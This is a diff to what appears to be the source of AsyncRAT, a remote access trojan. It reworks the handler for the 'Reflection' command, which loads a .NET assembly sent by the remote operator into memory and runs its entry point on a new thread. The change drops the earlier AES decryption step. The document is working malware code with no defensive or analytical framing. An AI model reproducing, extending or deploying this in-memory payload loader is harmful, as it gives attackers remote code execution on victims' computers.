@@ -328,7 +328,8 @@ Namespace AsyncRAT
 
                     Case PacketHeader.Reflection
                         Program.Send(CByte(PacketHeader.MsgReceived))
-                        Reflection(itm(1))
+                        Dim thread As Thread = New Thread(New ParameterizedThreadStart(AddressOf Reflection))
+                        thread.Start(itm(1))
                         Exit Select
 
                     Case PacketHeader.Ping
@@ -383,33 +384,15 @@ Namespace AsyncRAT
             End Try
         End Sub
 
-        Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
-        Private Shared Sub Reflection(ByVal buffer As Byte()) 'gigajew@hf
+        Private Shared Sub Reflection(ByVal buffer As Byte())
             Try
-                Dim parameters As Object() = Nothing
-                Dim assembly As Assembly = Thread.GetDomain().Load(AES_Decryptor(buffer))
-                Dim entrypoint As MethodInfo = assembly.EntryPoint
-                If entrypoint.GetParameters().Length > 0 Then
-                    parameters = New Object() {New String() {Nothing}}
-                End If
+                Dim Loader As Assembly = Assembly.Load(buffer)
 
-                Dim assemblyExecuteThread As Thread = New Thread(Sub()
-                                                                     Thread.BeginThreadAffinity()
-                                                                     Thread.BeginCriticalRegion()
-                                                                     Dim executeAssembly As ExecuteAssembly = New ExecuteAssembly(AddressOf entrypoint.Invoke)
-                                                                     executeAssembly(Nothing, parameters)
-                                                                     Thread.EndCriticalRegion()
-                                                                     Thread.EndThreadAffinity()
-                                                                 End Sub)
-                If parameters IsNot Nothing Then
-                    If parameters.Length > 0 Then
-                        assemblyExecuteThread.SetApartmentState(ApartmentState.STA)
-                    Else
-                        assemblyExecuteThread.SetApartmentState(ApartmentState.MTA)
-                    End If
+                If Loader.EntryPoint.GetParameters().Length > 0 Then
+                    Loader.EntryPoint.Invoke(Nothing, New Object() {New String() {Nothing}})
+                Else
+                    Loader.EntryPoint.Invoke(Nothing, Nothing)
                 End If
-
-                assemblyExecuteThread.Start()
             Catch ex As Exception
                 Program.Send(CByte(PacketHeader.ErrorMassages), ex.Message)
             End Try
